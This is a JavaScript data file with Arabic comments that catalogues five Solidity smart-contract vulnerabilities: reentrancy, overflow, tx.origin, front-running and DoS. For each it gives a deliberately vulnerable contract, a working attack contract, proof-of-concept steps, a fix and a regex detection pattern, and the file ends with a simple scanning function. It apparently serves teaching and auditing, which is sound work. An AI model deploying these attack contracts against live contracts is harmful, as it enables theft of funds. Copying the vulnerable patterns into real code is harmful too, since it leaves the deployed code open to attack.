// ===== vulnerability-db.js =====
// قاعدة بيانات الثغرات وأنماط الكشف

const VulnerabilityDB = {
    // 1. ثغرة Reentrancy
    reentrancy: {
        name: 'Reentrancy Attack',
        severity: 'critical',
        description: 'هجوم إعادة الدخول - العقد يرسل الأموال قبل تحديث الرصيد',
        pattern: /\.call\{value:[^}]*\}\([^)]*\)|\.send\(|\.transfer\(/g,
        cwe: 'CWE-841',
        
        // كود العقد الضعيف
        vulnerableContract: `// VulnerableBank.sol
pragma solidity ^0.8.0;

contract VulnerableBank {
    mapping(address => uint256) public balances;
    
    function deposit() public payable {
        balances[msg.sender] += msg.value;
    }
    
    // ❌ ثغرة: إرسال الأموال قبل تحديث الرصيد
    function withdraw(uint256 amount) public {
        require(balances[msg.sender] >= amount, "Insufficient balance");
        (bool success, ) = msg.sender.call{value: amount}("");
        require(success, "Transfer failed");
        balances[msg.sender] -= amount;
    }
    
    function getBalance() public view returns (uint256) {
        return address(this).balance;
    }
}`,

        // كود الهجوم
        attackContract: `// AttackReentrancy.sol
pragma solidity ^0.8.0;

import "./VulnerableBank.sol";

contract AttackReentrancy {
    VulnerableBank public bank;
    uint256 public attackCount;
    
    constructor(address _bankAddress) {
        bank = VulnerableBank(_bankAddress);
    }
    
    // استقبال الأموال وإعادة الهجوم
    receive() external payable {
        attackCount++;
        if (attackCount < 5) {
            uint256 amount = bank.balances(address(this));
            bank.withdraw(amount);
        }
    }
    
    function attack() public payable {
        require(msg.value == 1 ether, "Send 1 ETH");
        bank.deposit{value: 1 ether}();
        bank.withdraw(1 ether);
    }
    
    function withdrawProfits() public {
        payable(msg.sender).transfer(address(this).balance);
    }
}`,

        // خطوات إثبات الثغرة
        pocSteps: [
            '1. انشر عقد VulnerableBank',
            '2. أرسل 10 إيثر للبنك (محاكاة)',
            '3. انشر AttackReentrancy مع عنوان البنك',
            '4. المهاجم يرسل 1 إيثر لدالة attack()',
            '5. البنك يرسل 1 إيثر للمهاجم',
            '6. receive() تستدعي withdraw() مرة أخرى',
            '7. تتكرر العملية 5 مرات',
            '8. المهاجم يسحب 5 إيثر (ربح 4 إيثر)'
        ],

        // الإصلاح
        fix: `// ✅ التصحيح: تحديث الرصيد أولاً
function withdraw(uint256 amount) public {
    require(balances[msg.sender] >= amount, "Insufficient balance");
    balances[msg.sender] -= amount;  // ✅ أولاً
    (bool success, ) = msg.sender.call{value: amount}("");  // ✅ ثانياً
    require(success, "Transfer failed");
}

// أو استخدام ReentrancyGuard
import "@openzeppelin/contracts/security/ReentrancyGuard.sol";

contract SafeBank is ReentrancyGuard {
    function withdraw(uint256 amount) public nonReentrant {
        // الكود الآمن
    }
}`
    },

    // 2. ثغرة Overflow/Underflow
    overflow: {
        name: 'Arithmetic Overflow/Underflow',
        severity: 'warning',
        description: 'تجاوز السعة في العمليات الحسابية',
        pattern: /\+\+|--|\+=|-=|\*=|\/=|unchecked\s*\{/g,
        
        vulnerableContract: `// VulnerableToken.sol
pragma solidity ^0.7.0;  // ❌ إصدار قديم بدون حماية

contract VulnerableToken {
    mapping(address => uint256) public balances;
    uint256 public totalSupply;
    
    constructor() {
        totalSupply = 2**256 - 1;  // الحد الأقصى
    }
    
    // ❌ ثغرة Underflow
    function transfer(address to, uint256 amount) public {
        balances[msg.sender] -= amount;  // 0 - 1 = 2**256 - 1
        balances[to] += amount;
    }
    
    // ❌ ثغرة Overflow
    function mint(uint256 amount) public {
        totalSupply += amount;  // (2**256-1) + 1 = 0
        balances[msg.sender] += amount;
    }
}`,

        attackContract: `// AttackOverflow.sol
pragma solidity ^0.7.0;

import "./VulnerableToken.sol";

contract AttackOverflow {
    VulnerableToken public token;
    
    constructor(address _tokenAddress) {
        token = VulnerableToken(_tokenAddress);
    }
    
    function pocUnderflow() public {
        // الرصيد 0 -> نقل 1 -> يصبح الرصيد 2**256-1
        token.transfer(msg.sender, 1);
    }
    
    function pocOverflow() public {
        // totalSupply يصبح 0
        token.mint(1);
    }
}`,

        fix: `// ✅ التصحيح: استخدام Solidity ^0.8.0
pragma solidity ^0.8.0;  // overflow/underflow محمية تلقائياً

// أو استخدام SafeMath
import "@openzeppelin/contracts/utils/math/SafeMath.sol";

contract SafeToken {
    using SafeMath for uint256;
    
    function transfer(address to, uint256 amount) public {
        balances[msg.sender] = balances[msg.sender].sub(amount);
        balances[to] = balances[to].add(amount);
    }
}`
    },

    // 3. ثغرة Tx.Origin
    txorigin: {
        name: 'Tx.Origin Authentication',
        severity: 'critical',
        description: 'استخدام tx.origin للتحقق من الهوية',
        pattern: /tx\.origin/g,
        
        vulnerableContract: `// VulnerableWallet.sol
pragma solidity ^0.8.0;

contract VulnerableWallet {
    address public owner;
    
    constructor() {
        owner = tx.origin;  // ❌ ثغرة
    }
    
    modifier onlyOwner() {
        require(tx.origin == owner, "Not owner");  // ❌ خطأ
        _;
    }
    
    function withdrawAll() public onlyOwner {
        payable(owner).transfer(address(this).balance);
    }
}`,

        attackContract: `// AttackTxOrigin.sol
pragma solidity ^0.8.0;

import "./VulnerableWallet.sol";

contract AttackTxOrigin {
    VulnerableWallet public wallet;
    
    constructor(address _walletAddress) {
        wallet = VulnerableWallet(_walletAddress);
    }
    
    function attack() public {
        // الضحية يوقع على هذه المعاملة
        // tx.origin = الضحية ✅
        // msg.sender = هذا العقد
        wallet.withdrawAll();
    }
    
    receive() external payable {}
}`,

        fix: `// ✅ التصحيح: استخدام msg.sender
contract SafeWallet {
    address public owner;
    
    constructor() {
        owner = msg.sender;  // ✅
    }
    
    modifier onlyOwner() {
        require(msg.sender == owner, "Not owner");  // ✅
        _;
    }
}`
    },

    // 4. ثغرة Front-Running
    frontrun: {
        name: 'Front-Running',
        severity: 'warning',
        description: 'المهاجم يسبق المعاملات في mempool',
        pattern: /guess|prediction|lottery|reveal/g,
        
        vulnerableContract: `// VulnerableLottery.sol
pragma solidity ^0.8.0;

contract VulnerableLottery {
    uint256 public prize = 100 ether;
    uint256 public secret;
    
    function setSecret(uint256 _secret) public {
        secret = _secret;
    }
    
    // ❌ ثغرة: أي شخص يرسل الرقم الصحيح يفوز
    function guess(uint256 number) public {
        if (number == secret) {
            payable(msg.sender).transfer(prize);
        }
    }
}`,

        attackContract: `// AttackFrontRun.sol
pragma solidity ^0.8.0;

contract AttackFrontRun {
    function frontRun(address lottery, uint256 winningNumber) public {
        // نرسل معاملة بغاز أعلى لتسبق الضحية
        (bool success, ) = lottery.call{gas: 1000000}(
            abi.encodeWithSignature("guess(uint256)", winningNumber)
        );
        require(success, "Front-run failed");
    }
}`,

        fix: `// ✅ التصحيح: استخدام Commit-Reveal
contract SafeLottery {
    mapping(address => bytes32) public commitments;
    
    function commit(bytes32 hash) public {
        commitments[msg.sender] = hash;
    }
    
    function reveal(uint256 number) public {
        require(keccak256(abi.encodePacked(number)) == commitments[msg.sender]);
        // الفوز بعد الكشف
    }
}`
    },

    // 5. ثغرة DoS
    dos: {
        name: 'Denial of Service',
        severity: 'medium',
        description: 'منع العقد من العمل بحلقات لا نهائية',
        pattern: /for\s*\([^;]*;[^;]*;[^\)]*\)|while\s*\([^\)]*\)/g,
        
        vulnerableContract: `// VulnerableAirdrop.sol
pragma solidity ^0.8.0;

contract VulnerableAirdrop {
    address[] public users;
    
    // ❌ ثغرة: حلقة على مصفوفة غير محدودة
    function airdrop() public {
        for (uint256 i = 0; i < users.length; i++) {
            payable(users[i]).transfer(0.01 ether);
        }
    }
    
    function addUser(address user) public {
        users.push(user);
    }
}`,

        attackContract: `// AttackDoS.sol
pragma solidity ^0.8.0;

contract AttackDoS {
    receive() external payable {
        revert("I don't accept ETH");  // ❌ يمنع التوزيع
    }
    
    function attack(address airdrop) public {
        VulnerableAirdrop(airdrop).addUser(address(this));
        // الآن أي محاولة airdrop ستفشل
    }
}`,

        fix: `// ✅ التصحيح: نمط Pull over Push
contract SafeAirdrop {
    mapping(address => uint256) public pending;
    
    function claim() public {
        uint256 amount = pending[msg.sender];
        pending[msg.sender] = 0;
        payable(msg.sender).transfer(amount);
    }
}`
    }
};

// دالة للبحث عن ثغرات في الكود
VulnerabilityDB.scanCode = function(code) {
    const findings = [];
    
    for (const [type, vuln] of Object.entries(this)) {
        if (typeof vuln === 'object' && vuln.pattern) {
            const matches = code.match(vuln.pattern);
            if (matches) {
                findings.push({
                    type: type,
                    ...vuln,
                    count: matches.length,
                    matches: matches.slice(0, 5)
                });
            }
        }
    }
    
    return findings;
};
